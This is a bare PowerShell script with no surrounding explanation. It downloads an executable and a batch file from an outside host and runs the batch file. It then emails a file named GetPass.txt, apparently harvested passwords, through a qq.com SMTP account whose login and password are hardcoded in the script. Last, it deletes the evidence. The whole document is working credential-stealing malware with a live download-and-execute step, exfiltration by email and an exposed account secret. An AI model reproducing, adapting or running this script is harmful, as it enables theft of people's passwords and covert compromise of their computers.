(new-object System.Net.WebClient).DownloadFile('http://ilovesc.imwork.net//GetPass.rar','D:\Get.exe');

(new-object System.Net.WebClient).DownloadFile('http://ilovesc.imwork.net//Command.rar','D:\Command.bat');

D:\Command.bat;
$SMTPServer = 'smtp.qq.com'

$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)

$SMTPInfo.EnableSsl = $true 

$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('577093605@qq.com', '28942lh2576#$101');

$ReportEmail = New-Object System.Net.Mail.MailMessage

$ReportEmail.From = '577093605@qq.com'

$ReportEmail.To.Add('577093605@qq.com')

$ReportEmail.Subject = '000'

$ReportEmail.Body = '626'  

$ReportEmail.Attachments.Add('D:\GetPass.txt')
$SMTPInfo.Timeout = 1000000
$SMTPInfo.Send($ReportEmail)
$ReportEmail.Attachments.Dispose()

remove-item 'D:\GetPass.txt'

remove-item 'D:\Get.exe'
